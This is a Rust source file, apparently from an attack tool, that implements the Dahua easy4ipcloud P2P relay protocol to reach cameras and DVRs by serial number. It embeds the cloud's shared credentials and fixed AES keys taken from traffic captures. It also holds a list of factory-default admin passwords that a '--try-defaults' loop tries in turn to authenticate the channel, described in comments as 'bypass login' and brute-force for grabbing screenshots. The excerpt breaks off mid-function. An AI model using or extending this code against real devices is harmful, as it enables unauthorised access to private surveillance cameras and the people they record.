use std::collections::HashMap;
use std::net::SocketAddrV4;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use aes::cipher::{BlockEncrypt, KeyInit};
use aes::{Aes256, Block};
use async_trait::async_trait;
use base64::Engine;
use chrono::Utc;
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2_hmac;
use sha1::Digest;
use sha2::Sha256;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpStream, UdpSocket};
use tokio::sync::Mutex;
use tokio::time::timeout;

pub const MAIN_SERVER: &str = "www.easy4ipcloud.com:8800";
pub const USERNAME: &str = "cba1b29e32cb17aa46b8ff9e73c7f40b";
pub const USERKEY: &str = "996103384cdf19179e19243e959bbf8b";

/// Factory-default admin passwords (documented in Dahua manuals), used both for
/// DHIP bypass login (`--try-defaults`) and for the P2P channel DevAuth.
pub const DEFAULT_ADMIN_PASSWORDS: &[&str] =
    &["admin", "123456", "888888", "54321", "admin123", "12345"];

// The cloud encrypts the /info/device/{serial} payload with a fixed key and IV
// shared by every device (recovered from an easy4ipcloud capture).
const INFO_KEY: &[u8] = b"kRjmsUB&ezmdGLL67H#$ojw@XflcaIaf";
const INFO_IV: &[u8] = b"MydvJw*Iw1w&i^kk";
// IV used for the per-session LocalAddr encryption in the authenticated
// p2p-channel request.
const DEV_IV: &[u8] = b"2z52*lk9o6HRyJrf";

/// Set to true (e.g. via --verbose) to dump raw HTTP/PTCP exchange details.
pub static HTTP_DEBUG: AtomicBool = AtomicBool::new(false);

/// Set by `http_call` when a DISC status is received from the device on the current
/// channel. Callers should check this after `http_call` returns `None` to distinguish
/// an active disconnect from a timeout and abort early.
pub static LAST_CALL_DISC: AtomicBool = AtomicBool::new(false);

/// Returns true if the last `http_call` ended because the device sent a DISC status.
pub fn last_call_disc() -> bool {
    LAST_CALL_DISC.load(Ordering::Relaxed)
}

// ---- DH Response ----

#[derive(Debug)]
pub struct DHResponse {
    pub code: u16,
    pub status: String,
    pub body: Option<HashMap<String, String>>,
}

impl DHResponse {
    fn parse_body(body: &str) -> HashMap<String, String> {
        let mut parser = xml::reader::EventReader::from_str(body);
        let mut stack: Vec<String> = Vec::new();
        let mut tree = HashMap::new();
        loop {
            match parser.next() {
                Ok(xml::reader::XmlEvent::StartElement { name, .. }) => stack.push(name.local_name),
                Ok(xml::reader::XmlEvent::EndElement { .. }) => {
                    stack.pop();
                }
                Ok(xml::reader::XmlEvent::Characters(s)) => {
                    tree.insert(stack.join("/"), s);
                }
                Ok(xml::reader::XmlEvent::EndDocument) => break,
                Err(_) => break,
                _ => {}
            }
        }
        tree
    }

    pub fn parse_response(res: &str) -> Self {
        let mut parts = res.split("\r\n\r\n");
        let head = parts.next().unwrap_or("");
        let body = parts.next().unwrap_or("");

        let mut lines = head.split("\r\n");
        let status_line = lines.next().unwrap_or("");
        let mut status_parts = status_line.splitn(3, ' ');
        let _version = status_parts.next();
        let code: u16 = status_parts
            .next()
            .and_then(|c| c.parse().ok())
            .unwrap_or(0);
        let status = status_parts.next().unwrap_or("").to_string();

        let body = match body.trim().len() {
            0 => None,
            _ => Some(Self::parse_body(body)),
        };
        Self { code, status, body }
    }
}

// ---- P2P Client (simple probe for brute-force) ----

// ---- PTCP Protocol ----

#[derive(Debug)]
pub struct PTCPPayload {
    pub realm: u32,
    pub data: Vec<u8>,
}

impl PTCPPayload {
    pub fn parse(data: &[u8]) -> Self {
        // Defensive: short/malformed datagrams do arrive from some relays and
        // must never panic a batch run (seen in the field, 8-byte payloads).
        let realm = if data.len() >= 8 {
            u32::from_be_bytes([data[4], data[5], data[6], data[7]])
        } else {
            0
        };
        let start = 12.min(data.len());
        PTCPPayload {
            realm,
            data: data[start..].to_vec(),
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        let length = self.data.len() as u32;
        let header = (0x10000000 | length).to_be_bytes();
        let realm = self.realm.to_be_bytes();
        let padding = 0u32.to_be_bytes();
        [
            header.to_vec(),
            realm.to_vec(),
            padding.to_vec(),
            self.data.clone(),
        ]
        .concat()
    }
}

#[derive(Debug)]
pub enum PTCPBody {
    Sync,
    Command(Vec<u8>),
    Payload(PTCPPayload),
    Bind(u32, u32),
    Status(u32, String),
    Heartbeat,
    Empty,
}

impl PTCPBody {
    pub fn parse(data: &[u8]) -> Self {
        if data.is_empty() {
            return PTCPBody::Empty;
        }
        match data[0] {
            0x00 => PTCPBody::Sync,
            0x10 => PTCPBody::Payload(PTCPPayload::parse(data)),
            0x11 if data.len() >= 16 => PTCPBody::Bind(
                u32::from_be_bytes([data[4], data[5], data[6], data[7]]),
                u32::from_be_bytes([data[12], data[13], data[14], data[15]]),
            ),
            0x12 if data.len() >= 12 => {
                let realm = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
                let status = String::from_utf8_lossy(&data[12..]).to_string();
                PTCPBody::Status(realm, status)
            }
            0x13 => PTCPBody::Heartbeat,
            _ => PTCPBody::Command(data.to_vec()),
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        match self {
            PTCPBody::Sync => b"\x00\x03\x01\x00".to_vec(),
            PTCPBody::Command(data) => data.to_vec(),
            PTCPBody::Payload(p) => p.serialize(),
            PTCPBody::Bind(realm, port) => {
                let mut v = b"\x11\x00\x00\x00".to_vec();
                v.extend_from_slice(&realm.to_be_bytes());
                v.extend_from_slice(&[0u8; 4]);
                v.extend_from_slice(&port.to_be_bytes());
                v.extend_from_slice(&[127, 0, 0, 1]);
                v
            }
            PTCPBody::Status(realm, status) => {
                let mut v = b"\x12\x00\x00\x00".to_vec();
                v.extend_from_slice(&realm.to_be_bytes());
                v.extend_from_slice(&[0u8; 4]);
                v.extend_from_slice(status.as_bytes());
                v
            }
            PTCPBody::Heartbeat => b"\x13\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec(),
            PTCPBody::Empty => Vec::new(),
        }
    }

    pub fn len(&self) -> usize {
        match self {
            PTCPBody::Sync => 4,
            PTCPBody::Command(data) => data.len(),
            PTCPBody::Payload(p) => p.data.len() + 12,
            PTCPBody::Bind(_, _) => 20,
            PTCPBody::Status(_, s) => s.len() + 12,
            PTCPBody::Heartbeat => 12,
            PTCPBody::Empty => 0,
        }
    }
}

#[derive(Debug)]
pub struct PTCPPacket {
    pub sent: u32,
    pub recv: u32,
    pub pid: u32,
    pub lmid: u32,
    pub rmid: u32,
    pub body: PTCPBody,
}

impl PTCPPacket {
    pub fn parse(data: &[u8]) -> Self {
        // Defensive: datagrams shorter than the 24-byte PTCP header arrive from
        // some relays/devices; return an Empty packet instead of panicking.
        if data.len() < 24 {
            return PTCPPacket {
                sent: 0,
                recv: 0,
                pid: 0,
                lmid: 0,
                rmid: 0,
                body: PTCPBody::Empty,
            };
        }
        let sent = u32::from_be_bytes([data[4], data[5], data[6], data[7]]);
        let recv = u32::from_be_bytes([data[8], data[9], data[10], data[11]]);
        let pid = u32::from_be_bytes([data[12], data[13], data[14], data[15]]);
        let lmid = u32::from_be_bytes([data[16], data[17], data[18], data[19]]);
        let rmid = u32::from_be_bytes([data[20], data[21], data[22], data[23]]);
        let body = PTCPBody::parse(&data[24..]);
        PTCPPacket {
            sent,
            recv,
            pid,
            lmid,
            rmid,
            body,
        }
    }

    pub fn serialize(&self) -> Vec<u8> {
        let mut v = b"PTCP".to_vec();
        v.extend_from_slice(&self.sent.to_be_bytes());
        v.extend_from_slice(&self.recv.to_be_bytes());
        v.extend_from_slice(&self.pid.to_be_bytes());
        v.extend_from_slice(&self.lmid.to_be_bytes());
        v.extend_from_slice(&self.rmid.to_be_bytes());
        v.extend_from_slice(&self.body.serialize());
        v
    }
}

pub struct PTCPSession {
    pub sent: u32,
    pub recv: u32,
    pub count: u32,
    pub id: u32,
    pub rmid: u32,
}

impl PTCPSession {
    pub fn new() -> Self {
        PTCPSession {
            sent: 0,
            recv: 0,
            count: 0,
            id: 0,
            rmid: 0,
        }
    }

    pub fn send(&mut self, body: PTCPBody) -> PTCPPacket {
        let sent = self.sent;
        let recv = self.recv;
        let pid = match body {
            PTCPBody::Sync => 0x0002FFFF,
            _ => 0x0000FFFF - self.count,
        };
        let lmid = self.id;
        let rmid = self.rmid;
        self.sent += body.len() as u32;
        self.id += 1;
        self.count += match body {
            PTCPBody::Sync | PTCPBody::Empty | PTCPBody::Heartbeat => 0,
            _ => 1,
        };
        PTCPPacket {
            sent,
            recv,
            pid,
            lmid,
            rmid,
            body,
        }
    }

    pub fn recv(&mut self, packet: PTCPPacket) -> PTCPPacket {
        // Match p2pwn's accounting: the ack we send must reflect the *peer's*
        // advertised stream position (its Sent + payload), raised monotonically.
        // Cumulative `+=` under-counts whenever a datagram is lost or reordered,
        // and a lagging Recv stalls the peer's window mid-response — observed as
        // JPEG bodies cut short at ~2-4 KB (`7F00CB6PAZ3FC73`, Content-Length
        // 10244, 3484 bytes delivered, then silence). p2pwn reads full bodies.
        let adv = packet.sent.saturating_add(packet.body.len() as u32);
        if adv > self.recv {
            self.recv = adv;
        }
        self.rmid = packet.lmid;
        packet
    }

    pub fn recv_only_bytes(&mut self, packet: &PTCPPacket) {
        let adv = packet.sent.saturating_add(packet.body.len() as u32);
        if adv > self.recv {
            self.recv = adv;
        }
        self.rmid = packet.lmid;
    }
}

// ---- UDP helpers ----

pub async fn udp_send(sock: &UdpSocket, buf: &[u8]) {
    let _ = sock.send(buf).await;
}

pub async fn udp_recv(sock: &UdpSocket, dur: Duration) -> Option<Vec<u8>> {
    // 64 KB like p2pwn: a PTCP body may span several datagrams, but a single
    // large payload must never be truncated by the read buffer.
    let mut buf = vec![0u8; 65536];
    match timeout(dur, sock.recv(&mut buf)).await {
        Ok(Ok(n)) => Some(buf[..n].to_vec()),
        _ => None,
    }
}

pub async fn recv_until<F>(
    sock: &UdpSocket,
    session: &mut PTCPSession,
    timeout_dur: Duration,
    f: F,
) -> Option<PTCPPacket>
where
    F: Fn(&PTCPBody) -> bool,
{
    loop {
        let data = udp_recv(sock, timeout_dur).await?;
        if data.len() < 25 {
            continue;
        }
        let body = PTCPBody::parse(&data[24..]);

        if f(&body) {
            return Some(PTCPPacket::parse(&data));
        }

        let pkt = PTCPPacket::parse(&data);
        session.recv(pkt);

        if matches!(&body, PTCPBody::Empty) {
            udp_send(sock, &session.send(PTCPBody::Empty).serialize()).await;
        }
    }
}

// ---- Authenticated P2P channel (DevAuth / IpEncrptV2) ----

/// AES-256-OFB encrypt or decrypt in place (OFB is symmetric).
fn aes_ofb_apply(key: &[u8], iv: &[u8], data: &[u8]) -> Vec<u8> {
    let cipher = Aes256::new_from_slice(key).expect("AES key");
    let mut keystream = Block::clone_from_slice(iv);
    let mut out = Vec::with_capacity(data.len());
    for chunk in data.chunks(16) {
        cipher.encrypt_block(&mut keystream);
        for (i, b) in chunk.iter().enumerate() {
            out.push(b ^ keystream[i]);
        }
    }
    out
}

/// Decrypt the <Info> payload of /info/device/{serial} into JSON.
/// Returns the device salt and service ports, e.g.
/// {"httpport": 80, "privport": 37777, "randsalt": "...", "rtspport": 554}.
fn decrypt_device_info(enc_b64: &str) -> Option<serde_json::Value> {
    let data = base64::engine::general_purpose::STANDARD
        .decode(enc_b64)
        .ok()?;
    let dec = aes_ofb_apply(INFO_KEY, INFO_IV, &data);
    serde_json::from_slice(&dec).ok()
}

/// Look for a <RandSalt> element inside an error response body (the DH/XML map
/// keys are the dotted XML paths). Used when the anonymous /info/device did not
/// expose the salt but the refused channel response still carries it.
fn randsalt_from_err_body(body: &HashMap<String, String>) -> Option<String> {
    for (k, v) in body {
        if k == "RandSalt" || k.ends_with("/RandSalt") {
            let s = v.trim();
            if !s.is_empty() {
                return Some(s.to_string());
            }
        }
    }
    None
}

/// Device auth key: MD5("{user}:Login to {randsalt}:{password}") uppercase hex
/// as bytes — the same HA1 realm format used elsewhere.
fn p2p_auth_key(user: &str, password: &str, randsalt: &str) -> Vec<u8> {
    let s = format!("{}:Login to {}:{}", user, randsalt, password);
    hex::encode_upper(md5::compute(s.as_bytes()).as_ref()).into_bytes()
}

fn derive_session_key(key: &[u8], nonce: u32) -> [u8; 32] {
    let mut dk = [0u8; 32];
    pbkdf2_hmac::<Sha256>(key, nonce.to_string().as_bytes(), 20000, &mut dk);
    dk
}

/// Encrypt the LocalAddr for the authenticated p2p-channel request.
fn encrypt_local_addr(key: &[u8], nonce: u32, laddr: &str) -> String {
    let dk = derive_session_key(key, nonce);
    let enc = aes_ofb_apply(&dk, DEV_IV, laddr.as_bytes());
    base64::engine::general_purpose::STANDARD.encode(&enc)
}

/// Build the <CreateDate>/<DevAuth>/<Nonce>/<RandSalt>/<UserName> XML snippet.
fn build_dev_auth(key: &[u8], user: &str, nonce: u32, randsalt: &str, payload: &str) -> String {
    let curdate = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    build_dev_auth_at(key, user, nonce, randsalt, payload, curdate)
}

fn build_dev_auth_at(
    key: &[u8],
    user: &str,
    nonce: u32,
    randsalt: &str,
    payload: &str,
    curdate: u64,
) -> String {
    let message = format!("{}{}{}", nonce, curdate, payload);
    let mut mac = <Hmac<Sha256> as Mac>::new_from_slice(key).expect("HMAC key");
    mac.update(message.as_bytes());
    let digest = mac.finalize().into_bytes();
    let auth = base64::engine::general_purpose::STANDARD.encode(&digest);
    let salt = if randsalt.is_empty() {
        String::new()
    } else {
        format!("<RandSalt>{}</RandSalt>", randsalt)
    };
    format!(
        "<CreateDate>{}</CreateDate><DevAuth>{}</DevAuth><Nonce>{}</Nonce>{}<UserName>{}</UserName>",
        curdate, auth, nonce, salt, user
    )
}

// ---- P2P Handshake (full, for screenshots) ----

/// True when the p2p-channel answer is `2xx` with `<result>...Timeout...</result>`:
/// the relay asked the device to report and it never did.
fn p2p_channel_dev_timeout(res: &DHResponse) -> bool {
    res.code >= 200
        && res.code < 400
        && res.body.as_ref().is_some_and(|b| {
            b.get("body/result")
                .is_some_and(|r| r.to_ascii_lowercase().contains("timeout"))
        })
}

/// Read the `/device/{serial}/p2p-channel` response: skip interim `100 Trying`,
/// wait a second time when the answer is only late (first read has no body) and
/// re-send the request when the relay stays silent (lost UDP datagram) instead
/// of failing the handshake with a misleading message.
async fn read_p2p_channel(
    socket: &UdpSocket,
    channel_timeout: Duration,
    channel_path: &str,
    channel_body: &str,
    cseq: &mut u32,
) -> Result<DHResponse, String> {
    let mut res;
    let mut tries = 0;
    loop {
        res = socket.dh_read_raw_timeout(channel_timeout).await;
        tries += 1;
        if res.code == 100 {
            // Interim response: the final one follows on the same socket.
            if tries < 5 {
                continue;
            }
            break;
        }
        // code 0 = timeout/recv error; a 2xx/3xx with no body = the headers
        // arrived but the body datagram is still missing.
        let silent = res.code == 0;
        let missing_body = res.code < 400 && res.body.is_none();
        if (silent || missing_body) && tries < 3 {
            // First wait again (the answer may just be late); only when the
            // relay is still silent on the second read is the datagram
            // considered lost and the request re-sent.
            if silent && tries >= 2 {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!(
                        "[debug] p2p-channel: no answer after {} reads, re-sending request",
                        tries
                    );
                }
                socket
                    .dh_request(channel_path, Some(channel_body), cseq)
                    .await?;
            }
            continue;
        }
        break;
    }
    Ok(res)
}

pub struct HandshakeResult {
    pub device_socket: Arc<UdpSocket>,
    pub device_session: Arc<Mutex<PTCPSession>>,
    pub agent_socket: Arc<UdpSocket>,
    pub agent_session: Arc<Mutex<PTCPSession>>,
    /// Public IP of the device as reported by the relay in `body/PubAddr`.
    pub device_public_ip: String,
    /// HTTP port of the device, from the decrypted `/info/device` blob. Used
    /// by the snapshot path when no DHIP session could be established.
    pub device_http_port: Option<u16>,
    /// RTSP port of the device, from the decrypted `/info/device` blob.
    pub device_rtsp_port: Option<u16>,
    /// Private/SDK port (37777 by default) of the device, if the blob exposed it.
    pub device_priv_port: Option<u16>,
}

pub async fn p2p_handshake(
    serial: &str,
    main_server: &str,
    relay_mode: bool,
    admin_user: &str,
    admin_pass: &str,
    try_defaults: bool,
    channel_timeout: Duration,
    relay_server: Option<&str>,
    agent_server: Option<&str>,
) -> Result<HandshakeResult, String> {
    let mut cseq = 0u32;

    let socket = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind error: {}", e))?;
    let main_addr = if !main_server.is_empty() {
        main_server.to_string()
    } else {
        MAIN_SERVER.to_string()
    };
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] main server: {}", main_addr);
    }
    socket
        .connect(&main_addr)
        .await
        .map_err(|e| format!("connect to main server: {}", e))?;

    // Probe p2psrv
    socket.dh_request("/probe/p2psrv", None, &mut cseq).await?;
    let probe = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if probe.code == 0 {
        // code 0 = timeout/recv error; it used to slip past the >= 400 check
        // and surface much later as a confusing "No body in ..." error.
        return Err(format!("P2P server probe timeout: {}", probe.status));
    }
    if probe.code >= 400 {
        return Err(format!(
            "P2P server probe failed: {} {}",
            probe.code, probe.status
        ));
    }

    // Lookup p2psrv
    socket
        .dh_request(&format!("/online/p2psrv/{}", serial), None, &mut cseq)
        .await?;
    let online = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if online.code >= 400 {
        return Err(format!(
            "P2P lookup failed: {} {}",
            online.code, online.status
        ));
    }
    let p2psrv = match online.body {
        Some(ref b) => b.get("body/US").cloned().unwrap_or_default(),
        None => {
            return Err(format!(
                "No response for /online/p2psrv/{} ({})",
                serial, online.status
            ))
        }
    };
    if p2psrv.is_empty() {
        return Err(format!(
            "Device {} not found on P2P server (empty US)",
            serial
        ));
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] p2psrv: {}", p2psrv);
    }

    // Get relay (or use the forced one for cross-region devices the default
    // /online/relay cannot reach)
    let relay = match relay_server {
        Some(force) if !force.is_empty() => {
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!("[debug] relay: {} (forced)", force);
            }
            force.to_string()
        }
        _ => {
            socket.dh_request("/online/relay", None, &mut cseq).await?;
            let relay_resp = socket.dh_read_raw_timeout(Duration::from_secs(8)).await;
            match relay_resp.body {
                Some(ref b) => b.get("body/Address").cloned().unwrap_or_default(),
                None => {
                    return Err(format!(
                        "No response for /online/relay ({})",
                        relay_resp.status
                    ))
                }
            }
        }
    };
    if relay.is_empty() {
        return Err("No relay server address from /online/relay".to_string());
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] relay: {}", relay);
    }

    // Probe device
    let socket2 = UdpSocket::bind("0.0.0.0:0")
        .await
        .map_err(|e| format!("bind socket2: {}", e))?;
    socket2
        .connect(&p2psrv)
        .await
        .map_err(|e| format!("connect to p2psrv: {}", e))?;
    socket2
        .dh_request(&format!("/probe/device/{}", serial), None, &mut cseq)
        .await?;
    let probe_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if probe_resp.code == 0 {
        return Err(format!(
            "Device {} not reachable: probe timeout ({})",
            serial, probe_resp.status
        ));
    }
    if probe_resp.code >= 400 {
        return Err(format!(
            "Device {} not reachable (HTTP {} {})",
            serial, probe_resp.code, probe_resp.status
        ));
    }

    // Query device info to learn the password salt (newer firmware requires it
    // when opening an authenticated P2P channel) and, for the snapshot path,
    // the real HTTP/RTSP/private ports of the device.
    let mut randsalt = String::new();
    let mut device_http_port: Option<u16> = None;
    let mut device_rtsp_port: Option<u16> = None;
    let mut device_priv_port: Option<u16> = None;
    socket2
        .dh_request(&format!("/info/device/{}", serial), None, &mut cseq)
        .await?;
    let info_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] /info/device response: {} {} body={:?}",
            info_resp.code, info_resp.status, info_resp.body
        );
    }
    if info_resp.code < 400 {
        if let Some(info_b64) = info_resp.body.and_then(|b| b.get("body/Info").cloned()) {
            if let Some(info) = decrypt_device_info(&info_b64) {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] decrypted device info: {:?}", info);
                }
                let port = |k: &str| {
                    info.get(k)
                        .and_then(|v| v.as_u64())
                        .and_then(|n| u16::try_from(n).ok())
                };
                device_http_port = port("httpport");
                device_rtsp_port = port("rtspport");
                device_priv_port = port("privport");
                if let Some(s) = info.get("randsalt").and_then(|v| v.as_str()) {
                    randsalt = s.to_string();
                }
            } else if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!("[debug] failed to decrypt device info");
            }
        }
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] device randsalt: {}", randsalt);
    }

    // Open P2P channel
    let cid: [u8; 8] = rand::random();
    let cid_hex: Vec<String> = cid.iter().map(|b| format!("{:x}", b)).collect();

    let channel_path = format!("/device/{}/p2p-channel", serial);
    let channel_body = format!(
        "<body><Identify>{}</Identify><IpEncrpt>true</IpEncrpt><LocalAddr>127.0.0.1:{}</LocalAddr><version>5.0.0</version></body>",
        cid_hex.join(" "),
        socket.local_addr().unwrap().port(),
    );
    socket
        .dh_request(&channel_path, Some(&channel_body), &mut cseq)
        .await?;

    // Relay agent
    socket2
        .connect(&relay)
        .await
        .map_err(|e| format!("connect to relay: {}", e))?;
    socket2.dh_request("/relay/agent", None, &mut cseq).await?;
    let agent_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if agent_resp.code >= 400 {
        return Err(format!(
            "Relay agent error: {} {}",
            agent_resp.code, agent_resp.status
        ));
    }
    let data = match agent_resp.body {
        Some(b) => b,
        None => {
            return Err(format!(
                "No response for /relay/agent ({})",
                agent_resp.status
            ))
        }
    };
    let token = data.get("body/Token").cloned().unwrap_or_default();
    let rel_agent = data.get("body/Agent").cloned().unwrap_or_default();
    let mut agent = match agent_server {
        Some(force) if !force.is_empty() => {
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!("[debug] agent: {} (forced)", force);
            }
            force.to_string()
        }
        _ => rel_agent.clone(),
    };
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!("[debug] relay token: {} agent: {}", token, agent);
    }

    socket2
        .connect(&agent)
        .await
        .map_err(|e| format!("connect to agent: {}", e))?;
    socket2
        .dh_request(
            &format!("/relay/start/{}", token),
            Some("<body><Client>:0</Client></body>"),
            &mut cseq,
        )
        .await?;
    let start_resp = socket2.dh_read_raw_timeout(Duration::from_secs(8)).await;
    if start_resp.code >= 400 {
        return Err(format!(
            "Relay start error: {} {}",
            start_resp.code, start_resp.status
        ));
    }

    // Wait for device channel. The relay answers "100 Trying" before the final
    // response and datagrams get lost over UDP: skip interim answers, keep
    // waiting for a late answer and re-send the channel request when the relay
    // stays silent, instead of failing the handshake with a misleading message.
    let mut res = read_p2p_channel(
        &socket,
        channel_timeout,
        &channel_path,
        &channel_body,
        &mut cseq,
    )
    .await?;
    // The relay answers `200` with `<result>Dev_TimeOut</result>` when the
    // device never reported to it. The device may just be slow, so ask once
    // more before carrying on with a channel that has no device behind it.
    if p2p_channel_dev_timeout(&res) {
        eprintln!(
            "  [i] relay: device did not report (Dev_TimeOut); retrying p2p-channel once in 2s"
        );
        tokio::time::sleep(Duration::from_secs(2)).await;
        socket
            .dh_request(&channel_path, Some(&channel_body), &mut cseq)
            .await?;
        res = read_p2p_channel(
            &socket,
            channel_timeout,
            &channel_path,
            &channel_body,
            &mut cseq,
        )
        .await?;
    }
    // Dev_TimeOut can also mean the MAIN_SERVER simply cannot reach this
    // device's P2P session (cross-region devices report to a different node,
    // which is why the message is instant). The device keeps a persistent
    // connection to its assigned p2psrv, so ask the same p2p-channel there
    // before giving up. Relay mode only: the channel body advertises the main
    // socket's local port, which matters for hole-punching (device mode) but
    // not here, where all traffic goes through the agent.
    if relay_mode && p2p_channel_dev_timeout(&res) {
        eprintln!(
            "  [i] main server cannot reach this device; trying the p2p-channel straight to its p2psrv ({})",
            p2psrv
        );
        if let Ok(sock) = UdpSocket::bind("0.0.0.0:0").await {
            if sock.connect(&p2psrv).await.is_ok() {
                if sock
                    .dh_request(&channel_path, Some(&channel_body), &mut cseq)
                    .await
                    .is_ok()
                {
                    if let Ok(p2p_res) = read_p2p_channel(
                        &sock,
                        channel_timeout,
                        &channel_path,
                        &channel_body,
                        &mut cseq,
                    )
                    .await
                    {
                        if HTTP_DEBUG.load(Ordering::Relaxed) {
                            eprintln!(
                                "[debug] p2p-channel via p2psrv: {} {} body={:?}",
                                p2p_res.code, p2p_res.status, p2p_res.body
                            );
                        }
                        // Only adopt a response that actually reached the
                        // device; keep the earlier Dev_TimeOut otherwise so the
                        // "Server Nat Info!" fallback below still runs.
                        if !p2p_channel_dev_timeout(&p2p_res) {
                            res = p2p_res;
                        }
                    }
                }
            }
        }
    }
    // Some firmware/firmware variants refuse the anonymous channel with 403
    // OR 401. When the salt is not known, try to recover it from the channel
    // error body (the relay may echo <RandSalt> in the DevPwd_InvalidSalt case).
    let requires_auth = matches!(res.code, 401 | 403);
    // A Dev_TimeOut result does NOT necessarily mean the device is offline: on
    // some firmware the device simply ignores anonymous channel pushes (SmartPSS
    // always sends DevAuth). When we know the salt, retry authenticated.
    let needs_authed = requires_auth || (p2p_channel_dev_timeout(&res) && !randsalt.is_empty());
    if requires_auth && randsalt.is_empty() {
        if let Some(b) = &res.body {
            if let Some(s) = randsalt_from_err_body(b) {
                if HTTP_DEBUG.load(Ordering::Relaxed) {
                    eprintln!("[debug] randsalt from channel error body: {}", s);
                }
                randsalt = s;
            }
        }
    }
    let mut auth_key: Option<Vec<u8>> = None;
    if needs_authed && !randsalt.is_empty() {
        // Retry with the authenticated DevAuth/IpEncrptV2 channel using device
        // credentials: the explicit --admin-pass first, then the factory default
        // passwords when --try-defaults is set.
        if requires_auth {
            eprintln!(
                "[debug] P2P channel requires auth ({}); retrying with device credentials",
                res.code
            );
        } else {
            eprintln!(
                "  [i] anonymous p2p-channel gave Dev_TimeOut; retrying with authenticated DevAuth channel"
            );
        }
        let mut passwords: Vec<&str> = Vec::new();
        if !admin_pass.is_empty() {
            passwords.push(admin_pass);
        }
        if try_defaults {
            passwords.extend(DEFAULT_ADMIN_PASSWORDS);
        }
        for pw in passwords {
            let key = p2p_auth_key(admin_user, pw, &randsalt);
            let nonce: u32 = rand::random();
            let laddr = format!("127.0.0.1:{}", socket.local_addr().unwrap().port());
            let enc_laddr = encrypt_local_addr(&key, nonce, &laddr);
            let auth_xml = build_dev_auth(&key, admin_user, nonce, &randsalt, &enc_laddr);
            let body = format!(
                "<body>{auth_xml}<Identify>{}</Identify><IpEncrptV2>true</IpEncrptV2><LocalAddr>{}</LocalAddr><NatValueT>268435455</NatValueT><version>6.7.2</version></body>",
                cid_hex.join(" "),
                enc_laddr
            );
            socket
                .dh_request(
                    &format!("/device/{}/p2p-channel", serial),
                    Some(&body),
                    &mut cseq,
                )
                .await?;
            res = read_p2p_channel(
                &socket,
                channel_timeout,
                &format!("/device/{}/p2p-channel", serial),
                &body,
                &mut cseq,
            )
            .await?;
            let ok = res.code < 400 && !p2p_channel_dev_timeout(&res);
            if ok {
                auth_key = Some(key);
                if try_defaults && pw != admin_pass {
                    println!("  [i] P2P channel auth OK with default password '{}'", pw);
                }
                break;
            }
            if HTTP_DEBUG.load(Ordering::Relaxed) {
                eprintln!(
                    "[debug] DevAuth with '{}' failed: {} {} body={:?}",
                    pw, res.code, res.status, res.body
                );
            }
        }
    }
    if HTTP_DEBUG.load(Ordering::Relaxed) {
        eprintln!(
            "[debug] p2p-channel response: {} {} body={:?}",
            res.code, res.status, res.body
        );
    }
    if res.code == 0 {
        // dh_read_raw_timeout reports code 0 on timeout/recv error; without
        // this it fell through the `>= 400` check and surfaced as the
        // misleading "No body in P2P channel response".
        return Err(format!(
            "P2P channel timeout: no valid response from the relay ({})",
            res.status
        ));
    }
    if res.code >= 400 {
        if HTTP_DEBUG.load(Ordering::Relaxed) {
            eprintln!("[debug] p2p-channel auth'd response body: {:?}", res.body);
        }
        let hint = if randsalt.is_empty() {
            " (no device salt available — firmware may need --admin-pass)"
        } else if !admin_pass.is_empty() {
            " — check --admin-user/--admin-pass credentials"
        } else {
            " — retry with --admin-pass or --try-defaults"
        };
        return Err(format!(
            "P2P channel error: {} {}{}",
            res.code, res.status, hint
        ));
    }
    let resp_body = match res.body {
        Some(b) => b,
        None => {
            return Err(format!(
                "No body in P2P channel response ({} {})",
                res.code, res.status
            ))
        }
    };
    let mut device_pub = pub_addr_from(&resp_body);
    if let Some(result) = resp_body
        .get("body/result")
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
    {
        // e.g. <result>Dev_TimeOut</result>: the relay asked the device to
        // report and it never did. This is the real reason the PubAddr is
        // missing, so surface it instead of the later, vaguer failures.
        eprintln!(
            "  [i] p2p-channel result from relay: {} (device did not report to the relay)",
            result
        );
    }
    if device_pub.is_empty() {
        // Not fatal yet: the "Server Nat Info!" answer of the relay-channel
        // below carries the same PubAddr, and in --relay mode the address is
        // only used for geo/direct-IP (all traffic goes through the agent).
        eprintln!(
            "  [i] p2p-channel response carries no PubAddr ({}) — body: {}",
            res.status,
            body_preview(&resp_body, 200)
        );
    } else {
        socket
            .connect(&device_pub)
            .await
            .map_err(|e| format!("connect to device {}: {}", device_pub, e))?;
    }
    // Device public address taken from the "Server Nat Info!" response when the
    // p2p-channel did not carry one (same value, different step of the flow).
    let mut nat_pub = String::new();

    // Relay channel — try the main server first, then the device's own p2psrv
    // and the relay server (some device families, e.g. China-market DVRs, only
    // honour the relay-channel when it is sent to the server that actually
    // hosts the device's channel). The "Server Nat Info!" response can arrive
    // either from the server we sent the request to or from the agent.
    let rc_body = if let Some(key) = &auth_key {
